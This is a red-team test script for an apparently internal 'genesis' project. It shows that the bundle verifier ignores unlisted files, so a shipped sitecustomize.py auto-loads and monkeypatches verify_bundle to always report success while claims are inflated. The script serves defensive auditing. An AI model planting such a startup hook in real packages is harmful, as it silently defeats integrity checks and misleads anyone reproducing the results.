#!/usr/bin/env python3
"""R3: files under analysis_code/ that CODE_IDENTITY.json does not list are never checked,
so a bundle that verify_bundle accepts ("shipped analysis code matches its code
identity") can ship extra code that the documented reproduction command executes.

verify_bundle only requires (a) the on-disk file set == MANIFEST['files'] (both
producer-written) and (b) every path *listed in* CODE_IDENTITY.json to hash
correctly. An extra analysis_code/src/sitecustomize.py is imported by Python at
start-up for anyone who follows REPRODUCE.md (PYTHONPATH=analysis_code/src). (Not
demonstrated: a package genesis/kernel/evidence/__init__.py would likewise shadow
the listed evidence.py.)
  PYTHONPATH=src python3 -W ignore audit/redteam_b14_round2/r3_unidentified_shipped_code.py
"""
import json
from pathlib import Path
import subprocess
import sys
import tempfile
import zipfile

sys.path.insert(0, str(Path(__file__).resolve().parent))
import _r2  # noqa: E402
from genesis.common import canonical, code_identity  # noqa: E402
from genesis.kernel.evidence import EvidenceKernel  # noqa: E402
from genesis.release_bundle import build_bundle, verify_bundle  # noqa: E402
from genesis.store import Store  # noqa: E402

SITE = b'''import sys
print("[attacker sitecustomize loaded: this code is not in CODE_IDENTITY.json]", file=sys.stderr)
import genesis.release_bundle as _rb
_real = _rb.verify_bundle
def verify_bundle(path, **kw):
    out = _real(path, **kw)
    return dict(out, ok=True, problems=[])
_rb.verify_bundle = verify_bundle
'''

d = Path(tempfile.mkdtemp())
with Store(d / 'c') as s:
    s.set_state('source_hash', code_identity(_r2.REPO)['sha256'])
    k = EvidenceKernel(s)
    run = k.record('execution_receipt', {'r': 1}, route='genesis.campaign', source_hash='c' * 64, verdict='VALID')
    k.create_claim('c', 'host H has a subgraph with 7 edges', 'host H', [run])
build_bundle(d / 'c', d / 'honest.zip', report='')
print('honest bundle verify ok:', verify_bundle(d / 'honest.zip')['ok'])


def add_code(files, manifest):
    files['analysis_code/src/sitecustomize.py'] = SITE


_r2.rewrite_bundle(d / 'honest.zip', d / 'shipped.zip', add_code)
r = verify_bundle(d / 'shipped.zip')
print('bundle with extra analysis_code/src/sitecustomize.py: trusted verify_bundle ok:', r['ok'], r['problems'])

# A reproducer follows REPRODUCE.md on the shipped bundle; we also inflate CLAIMS.json after extraction.
x = d / 'extracted'
with zipfile.ZipFile(d / 'shipped.zip') as z:
    z.extractall(x)
rel = next(x.glob('release_*'))
claims = json.loads((rel / 'CLAIMS.json').read_bytes())
claims['claims'][0]['effective_levels']['math'] = 'OPTIMALITY_CHECKED'
(rel / 'CLAIMS.json').write_bytes(canonical(claims))
print('trusted verify_bundle on the inflated extraction:', verify_bundle(rel)['ok'])
cmd = "from genesis.release_bundle import verify_bundle; r=verify_bundle('.'); print({'ok': r['ok'], 'problems': r['problems']})"
p = subprocess.run([sys.executable, '-c', cmd], cwd=rel, capture_output=True, text=True,
                   env={'PYTHONPATH': 'analysis_code/src', 'PATH': '/usr/bin:/bin', 'PYTHONDONTWRITEBYTECODE': '1',
                        'GENESIS_TOOLCHAIN': '/home/claude/toolchain'})
print('REPRODUCE.md step 2 stderr:', p.stderr.strip().splitlines()[:1])
print('REPRODUCE.md step 2 stdout:', p.stdout.strip())
print('ATTACK_SUCCEEDED' if r['ok'] and "'ok': True" in p.stdout else 'ATTACK_BLOCKED')
